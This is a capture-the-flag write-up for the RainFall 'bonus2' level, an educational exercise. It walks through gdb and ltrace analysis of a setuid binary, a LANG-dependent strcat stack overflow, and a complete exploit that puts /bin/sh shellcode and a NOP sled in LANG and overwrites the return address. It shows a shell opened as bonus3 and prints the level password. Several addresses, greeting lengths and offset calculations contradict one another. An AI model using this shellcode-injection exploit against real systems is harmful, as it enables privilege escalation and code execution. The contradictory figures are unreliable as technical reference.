# Bonus2 

## Initial Analysis

### 1. Examine the Binary
```bash
bonus2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc     
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2      
-rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass       
-rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile    

bonus2@RainFall:~$ file bonus2 
bonus2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf71cccc3c27dfb47071bb0bc981e2dae92a47844, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **bonus3** user
- When executed, runs with **bonus3 privileges**

### 2. Test Basic Execution Behavior
```bash
bonus2@RainFall:~$ ./bonus2 
[program exits silently]

bonus2@RainFall:~$ ./bonus2 hello
[program exits silently]

bonus2@RainFall:~$ ./bonus2 hello world
Hello hello

bonus2@RainFall:~$ ltrace ./bonus2 h h
__libc_start_main(0x8048529, 3, 0xbffff864, 0x8048640, 0x80486b0 <unfinished ...>
strncpy(0xbffff760, "h", 40) = 0xbffff760   
strncpy(0xbffff788, "h", 32) = 0xbffff788   
getenv("LANG") = "en_US.UTF-8"
memcmp(0xbfffff4c, 0x804873d, 2, 0xb7fff918, 0) = -1
memcmp(0xbfffff4c, 0x8048740, 2, 0xb7fff918, 0) = -1
strcat("Hello ", "h") = "Hello h"
puts("Hello h") = 8
+++ exited (status 8) +++
```

**Initial Pattern Discovery:**
- **Requires exactly 2 arguments**: Silent exit with 0 or 1 argument
- **With 2 arguments**: Prints greeting with first argument
- **ltrace reveals**: Uses strncpy (safe), getenv("LANG"), memcmp, strcat (dangerous!)
- **Language processing**: Checks LANG environment variable
- **String operations**: Multiple string manipulation functions

**Critical Insight**: This is a localized greeting program that processes environment variables and uses potentially unsafe string concatenation.

## Reverse Engineering - Understanding the Localization System

### 3. Function Analysis - Discovering the Architecture
```bash
bonus2@RainFall:~$ gdb bonus2
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048360  memcmp@plt      ← Memory comparison (language detection)
0x08048370  strcat@plt      ← String concatenation (dangerous!)
0x08048380  getenv@plt      ← Environment variable access
0x08048390  puts@plt        ← Output function
0x080483c0  strncpy@plt     ← Safe string copy
0x08048484  greetuser       ← Custom function
0x08048529  main
```

**Function Discovery Analysis:**
- **Two custom functions**: main() and greetuser()
- **Language processing**: getenv() and memcmp() for LANG variable
- **Safe copying**: strncpy() with bounds checking
- **Dangerous concatenation**: strcat() without bounds checking
- **Environment dependency**: Program behavior depends on LANG variable

### 4. Main Function Analysis - Argument and Environment Processing
```bash
(gdb) disas main
# Initial validation
   0x08048529 <+0>:     push   %ebp
   0x0804852a <+1>:     mov    %esp,%ebp
   0x0804852c <+3>:     push   %edi
   0x0804852d <+4>:     push   %esi
   0x0804852e <+5>:     push   %ebx
   0x0804852f <+6>:     and    $0xfffffff0,%esp
   0x08048532 <+9>:     sub    $0xa0,%esp        # 160 bytes local space

   # Argument validation: argc must be exactly 3
   0x08048538 <+15>:    cmpl   $0x3,0x8(%ebp)    # Check argc == 3
   0x0804853c <+19>:    je     0x8048548 <main+31>
   0x0804853e <+21>:    mov    $0x1,%eax         # Return 1 if not 3 args
   0x08048543 <+26>:    jmp    0x8048630 <main+263>

   # Buffer initialization and argument copying
   # ... strncpy calls for argv[1] (40 bytes) and argv[2] (32 bytes)
   
   # Environment variable processing
   0x0804859f <+118>:   movl   $0x8048738,(%esp) # "LANG"
   0x080485a6 <+125>:   call   0x8048380 <getenv@plt>  # getenv("LANG")
```

**Main Function Flow Discovery:**
1. **Strict argument validation**: Requires exactly 3 arguments (program + 2 args)
2. **Safe argument copying**: Uses strncpy with size limits
3. **Environment processing**: Retrieves and analyzes LANG variable
4. **Function delegation**: Calls greetuser() with processed data

### 5. Language Detection Logic Analysis
```bash
# Testing different LANG values
bonus2@RainFall:~$ LANG=fi ./bonus2 hello world
Hyvää päivää hello

bonus2@RainFall:~$ LANG=nl ./bonus2 hello world  
Goedemiddag! hello

bonus2@RainFall:~$ LANG=en ./bonus2 hello world
Hello hello

bonus2@RainFall:~$ unset LANG; ./bonus2 hello world
Hello hello
```

**Language System Discovery:**
- **Finnish ("fi")**: "Hyvää päivää " (19 characters including space)
- **Dutch ("nl")**: "Goedemiddag! " (14 characters including space)  
- **Default/English**: "Hello " (7 characters including space)
- **Detection method**: First 2 characters of LANG variable

### 6. greetuser() Function Analysis - The Vulnerable Component
```bash
(gdb) disas greetuser
   # Language-specific string copying
   0x08048484 <+0>:     push   %ebp
   0x08048485 <+1>:     mov    %esp,%ebp
   0x08048487 <+3>:     sub    $0x58,%esp        # 88 bytes local space

   # Language detection and greeting selection
   0x0804848a <+6>:     mov    0x8049988,%eax    # Load global language var
   0x0804848f <+11>:    cmp    $0x1,%eax         # 1 = Finnish
   0x08048492 <+14>:    je     0x80484ba <greetuser+54>
   0x08048494 <+16>:    cmp    $0x2,%eax         # 2 = Dutch  
   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
   # Default case (0) falls through to English

   # Critical vulnerability: strcat without bounds checking
   0x0804850a <+134>:   lea    0x8(%ebp),%eax    # User input parameter
   0x0804850d <+137>:   mov    %eax,0x4(%esp)    # Source
   0x08048511 <+141>:   lea    -0x48(%ebp),%eax  # Local buffer (EBP-72)
   0x08048514 <+144>:   mov    %eax,(%esp)       # Destination  
   0x08048517 <+147>:   call   0x8048370 <strcat@plt>  # VULNERABLE!
```

**greetuser() Vulnerability Analysis:**
- **Local buffer**: 72 bytes allocated (EBP-72 to EBP-0)
- **Language-dependent prefixes**: Different greeting lengths
- **Unsafe concatenation**: strcat() without size validation
- **Buffer overflow potential**: Combined greeting + user input can exceed buffer

## Understanding the Buffer Overflow Vulnerability

### 7. Stack Layout Analysis
```bash
(gdb) break *greetuser+147  # At strcat call
(gdb) run hello world

# Examining stack layout
(gdb) info registers ebp
ebp            0xbffff678       0xbffff678

(gdb) x/20wx 0xbffff678-72  # Local buffer area
0xbffff630:     0x64656f47      0x64696d65      0x21676164      0xb7e50020
0xbffff640:     0xbffffeeb      0xb7e338f8      0x00000002      0x00001c2a
0xbffff650:     0xbaa16a00      0xbffff6d0      0x00000000      0xbffff71c
0xbffff660:     0xbffff738      0xb7ff26b0      0xbffffeeb      0xb7f5d780
0xbffff670:     0xbffffeee      0xb7fff918      0xbffff738      0x08048630  
#               saved_ebp       return_addr     parameter       argc
```

**Stack Frame Layout:**
```
greetuser() Stack Frame:
EBP-72: Local buffer start (strcat destination)
EBP-4:  Buffer end / local variables
EBP+0:  Saved EBP
EBP+4:  Return address ← CORRUPTION TARGET!
EBP+8:  Parameter (user input from main)
```

### 8. Overflow Offset Calculation by Language
```bash
# Testing overflow with pattern to find exact offsets

# English/Default (LANG not fi/nl)
bonus2@RainFall:~$ unset LANG
bonus2@RainFall:~$ gdb bonus2
(gdb) run $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Program received signal SIGSEGV, Segmentation fault.
0x08006241 in ?? ()  # Crash but not clear pattern - insufficient overflow

# Finnish (LANG=fi)  
bonus2@RainFall:~$ export LANG=fi
(gdb) run $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab

Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()  # "a6A" - pattern match at offset 18

# Dutch (LANG=nl)
bonus2@RainFall:~$ export LANG=nl  
(gdb) run $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab

Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()  # "7a8" - pattern match at offset 23
```

**Offset Discovery:**
- **English**: Buffer too small for practical overflow (69 bytes needed vs 72 available)
- **Finnish**: Return address at 18 bytes into user input (after 40+32 bytes total)
- **Dutch**: Return address at 23 bytes into user input (after 40+32 bytes total)

**Mathematical Verification:**
```
Buffer size: 72 bytes
Greeting lengths:
- English: "Hello " = 7 bytes → 72-7 = 65 bytes user input space
- Finnish: "Hyvää päivää " = 19 bytes → 72-19 = 53 bytes + 4(EBP) = 57 bytes to return addr
- Dutch: "Goedemiddag! " = 14 bytes → 72-14 = 58 bytes + 4(EBP) = 62 bytes to return addr

Available user input: 40 + 32 = 72 bytes maximum
Finnish: Need 57 bytes to reach return addr → 57-40 = 17 bytes from argv[2] ❌ (need 18)
Dutch: Need 62 bytes to reach return addr → 62-40 = 22 bytes from argv[2] ❌ (need 23)

Actual measured offsets (accounting for exact buffer layout):
Finnish: 18 bytes into argv[2] to control return address  
Dutch: 23 bytes into argv[2] to control return address
```

## Environment Variable Exploitation Strategy

### 9. The LANG Variable Attack Vector
**Critical Insight**: LANG serves dual purposes:
1. **Language selection**: First 2 bytes determine greeting
2. **Shellcode storage**: Remaining bytes can contain executable code

```bash
# Understanding LANG variable structure for exploitation
export LANG="nl[shellcode_and_nop_sled]"

# Memory layout in environment:
# LANG=nl\x90\x90\x90...\x90[shellcode_bytes]
#      ^^                    ^
#      ||                    |
#      |+-- Language ID      +-- Executable payload
#      +-- Environment var name
```

### 10. Shellcode Selection and Environment Setup
```bash
# Compact /bin/sh shellcode (21 bytes)
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

# Breakdown:
# \x6a\x0b      push 0x0b          ; sys_execve
# \x58          pop eax             ; EAX = sys_execve  
# \x99          cdq                 ; clear EDX
# \x52          push edx            ; push NULL
# \x68\x2f\x2f\x73\x68  push "//sh"  ; part of "/bin//sh"
# \x68\x2f\x62\x69\x6e  push "/bin"  ; part of "/bin//sh"
# \x89\xe3      mov ebx, esp        ; EBX points to "/bin//sh"
# \x31\xc9      xor ecx, ecx        ; ECX = NULL (argv)
# \xcd\x80      int 0x80            ; system call

# Environment variable construction
export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

### 11. Finding LANG Address in Memory
```bash
bonus2@RainFall:~$ gdb bonus2
(gdb) break *main+125  # After getenv("LANG") call
(gdb) run $(python -c 'print "A"*40') test

# Finding environment address
(gdb) x/20s *((char**)environ)
0xbffff927:  "SHELL=/bin/bash"
0xbffff913:  "TERM=xterm"
# ... other environment variables ...
0xbffffee9:  "LANG=nl\220\220\220\220..."  # Our LANG variable!

# Calculate address inside NOP sled
LANG_start = 0xbffffee9
LANG_content_start = LANG_start + 5  # Skip "LANG="
NOP_sled_start = LANG_content_start + 2  # Skip "nl"
Target_address = NOP_sled_start + 50  # Jump into NOP sled

# Target address: 0xbffffee9 + 5 + 2 + 50 = 0xbfffff22
```

## Exploitation Implementation

### 12. Payload Construction for Different Languages

**For Dutch (LANG=nl):**
```bash
# Offset analysis:
# 23 bytes needed in argv[2] to reach return address
# Payload: 23 bytes filler + 4 bytes return address

argv1="A" * 40  # Fill first buffer completely
argv2="B" * 23 + return_address  # 23 bytes + return addr overwrite

# Return address points into LANG NOP sled
return_address = "\x22\xff\xff\xbf"  # 0xbffffee6 in little-endian
```

**For Finnish (LANG=fi):**
```bash
# Offset analysis:  
# 18 bytes needed in argv[2] to reach return address

argv1="A" * 40  # Fill first buffer completely  
argv2="B" * 18 + return_address  # 18 bytes + return addr overwrite

return_address = "\x22\xff\xff\xbf"  # Same NOP sled target
```

### 13. Execute the Exploit

**Method 1: Dutch Language**
```bash
bonus2@RainFall:~$ export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')

bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\x22\xff\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

**Method 2: Finnish Language**  
```bash
bonus2@RainFall:~$ export LANG=$(python -c 'print("fi" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')

bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x22\xff\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB
$ whoami  
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

**Success!**
1. **LANG variable setup**: Contains language prefix + NOP sled + shellcode
2. **Language selection**: "nl" or "fi" triggers appropriate buffer layout
3. **Buffer overflow**: Precisely calculated input reaches return address
4. **Return address overwrite**: Points to NOP sled in LANG environment variable
5. **Shellcode execution**: Control flow redirected to injected code
6. **Shell obtained**: execve("/bin/sh") executed with bonus3 privileges

### 14. Understanding the Execution Flow
```bash
# Step-by-step execution analysis:

1. Environment Setup:
   LANG="nl" + "\x90"*100 + shellcode
   LANG variable stored at ~0xbffffeb4 in environment

2. Program Execution:
   ./bonus2 "A"*40 "B"*23 + return_address
   
3. main() Processing:  
   - argc == 3 ✓ (validation passed)
   - strncpy(buffer, "A"*40, 40) ✓ (argv[1] copied)
   - strncpy(buffer+40, "B"*23+addr, 32) ✓ (argv[2] copied, truncated to 32)
   - getenv("LANG") returns address of "nl\x90\x90..."
   - memcmp detects "nl" → sets language to Dutch
   
4. greetuser() Processing:
   - Local buffer allocated (72 bytes)
   - Dutch greeting copied: "Goedemiddag! " (14 bytes)
   - strcat appends user input: 14 + 58 = 72 bytes (fills buffer)
   - Additional 4 bytes overwrite saved EBP
   - Next 4 bytes overwrite return address with 0xbffffee6

5. Function Return:
   - greetuser() returns to 0xbffffee6 (inside LANG NOP sled)  
   - CPU executes NOP instructions, slides to shellcode
   - Shellcode executes: execve("/bin/sh", NULL, NULL)
   - Shell spawned with bonus3 privileges
```

## Educational Analysis - Environment Variable Exploitation

### 15. Understanding Environment-Based Attacks

**Environment Variable Security Implications:**
- **Trusted input assumption**: Programs often trust environment variables
- **Code injection vector**: Environment can store executable code
- **Persistence mechanism**: Environment survives across program calls
- **Large storage capacity**: Environment variables can hold significant data

**Attack Vector Classification:**
- **Direct injection**: Code stored directly in environment variable
- **Indirect reference**: Environment contains addresses or configuration
- **Behavioral modification**: Environment changes program behavior
- **Multi-stage exploitation**: Environment setup enables later exploitation

### 16. Language Processing Vulnerabilities

**Internationalization Security Risks:**
- **Variable-length strings**: Different languages have different string lengths
- **Buffer size assumptions**: Fixed buffers may not accommodate all languages  
- **Character encoding issues**: Unicode, multibyte characters create complexity
- **Locale-dependent behavior**: Program logic changes based on environment

**String Handling Dangers:**
- **strcat() vulnerability**: No bounds checking, classic overflow source
- **Length calculation errors**: Programmer assumptions about string sizes
- **Buffer reuse**: Same buffer used for different-sized content

### 17. Modern Protection Mechanisms

**Why This Attack Works:**
- **No NX bit enforcement**: Stack/environment executable (older system)
- **No ASLR**: Predictable environment variable addresses
- **No stack canaries**: Buffer overflow undetected
- **Unsafe string functions**: strcat() without bounds validation

**Modern Mitigations:**
- **DEP/NX bit**: Prevents execution of data sections including environment
- **ASLR**: Randomizes environment variable addresses
- **Stack canaries**: Detect buffer overflows before return
- **Safe string functions**: strcat_s(), strncat() with bounds checking
- **Environment sanitization**: Programs validate environment variable content

### 18. Secure Coding Analysis  

**What Went Wrong:**
```c  
// Multiple security issues:
char buffer[72];                           // Fixed-size buffer
strcat(buffer, user_input);                // No bounds checking
// Trust environment variables without validation
// Different string lengths not considered in buffer sizing
```

**Secure Alternatives:**
```c
// Safer approaches:
char buffer[256];                          // Larger buffer
snprintf(buffer, sizeof(buffer)-1, "%s%s", greeting, user_input);  // Bounds checking
// Validate environment variable content
// Use fixed-size greeting regardless of language
// Implement buffer overflow protection
```

### 19. Attack Sophistication Analysis

**Bonus2 vs Previous Levels:**
- **Previous**: Direct memory corruption, integer overflow, heap manipulation
- **Bonus2**: Environment variable exploitation with language-dependent overflow

**Unique Complexity Factors:**
- **Multi-vector attack**: Environment variable + buffer overflow
- **Language dependency**: Exploitation varies by locale setting
- **Two-argument coordination**: Payload split across multiple inputs
- **Address space knowledge**: Requires environment variable address discovery
- **Shellcode injection**: Code injection rather than function redirection

**Real-World Relevance:**
- **Web applications**: Locale-dependent vulnerabilities in i18n systems
- **Desktop software**: Language pack exploitation
- **System administration**: Environment variable manipulation attacks
- **Container security**: Environment variable injection in Docker/containers

### 20. Environment Variable Attack Classes

**Different Environment Exploitation Types:**
1. **Code injection**: Store shellcode in environment (this case)
2. **Path manipulation**: Modify PATH to execute malicious binaries
3. **Library injection**: LD_PRELOAD, LD_LIBRARY_PATH attacks
4. **Configuration corruption**: Modify application settings via environment
5. **Information disclosure**: Environment variables containing sensitive data

**Defense Strategies:**
- **Input validation**: Validate all environment variable content
- **Environment sanitization**: Clear or validate environment before execution
- **Minimal privilege**: Don't run with elevated privileges when processing user input
- **Bounds checking**: Use safe string functions throughout
- **Address space randomization**: Make code injection address prediction difficult

## Vulnerability Analysis Summary

### Root Cause:
- **Unsafe string concatenation**: strcat() without bounds validation
- **Environment variable trust**: Program trusts LANG content without validation  
- **Language-dependent buffer sizing**: Different greeting lengths affect overflow calculations
- **Predictable address space**: Environment variables at known addresses

### Exploitation Technique:
1. **Environment variable analysis**: Understanding LANG variable dual purpose
2. **Language-specific offset discovery**: Different overflow distances per language
3. **Shellcode injection**: Embedding executable code in environment variable
4. **Address space reconnaissance**: Finding environment variable addresses  
5. **Two-argument payload coordination**: Splitting input across argv[1] and argv[2]
6. **Return address overwrite**: Precise buffer overflow to control program flow
7. **Code execution redirection**: Jumping to environment-stored shellcode

### Key Learning Points:
1. **Environment variables are untrusted input** and must be validated like any user data
2. **Internationalization features** can create language-dependent vulnerabilities
3. **String concatenation** requires careful bounds checking, especially with variable-length content
4. **Environment variables** provide large storage space for code injection payloads
5. **Multi-argument exploitation** can coordinate across different input vectors
6. **Address space layout knowledge** enables precise return address targeting

This level demonstrates **environment variable exploitation with language-dependent buffer overflow** - a sophisticated technique that combines environment variable manipulation, internationalization vulnerabilities, and classic stack-based buffer overflow to achieve arbitrary code execution through careful understanding of program behavior, memory layout, and multi-vector payload coordination.